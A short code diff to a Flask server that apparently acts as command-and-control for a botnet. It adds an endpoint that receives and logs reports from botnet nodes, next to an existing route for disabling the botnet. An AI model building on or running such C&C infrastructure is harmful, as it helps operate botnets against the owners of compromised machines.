@@ -88,6 +88,16 @@ def getLog():
     return logresult, 200
 
 
+# ROUTING SERVER - logs visualization (debug purposes)
+@app.route('/botnetlogs', methods=['POST'])
+def addBotnetLogs():
+    # retrieving from post and formatting entries
+    botnet = request.json['botnet']
+    log    = request.json['log']
+    app.logger.info("[{0}] => reached by botnet {1} - usage: {2}".format(str(datetime.utcnow()), str(botnet), str(log)))
+    
+    return "OK", 200
+
 
 # ROUTING SERVER - disable the botnet via C&C
 @app.route('/disable', methods=['POST'])
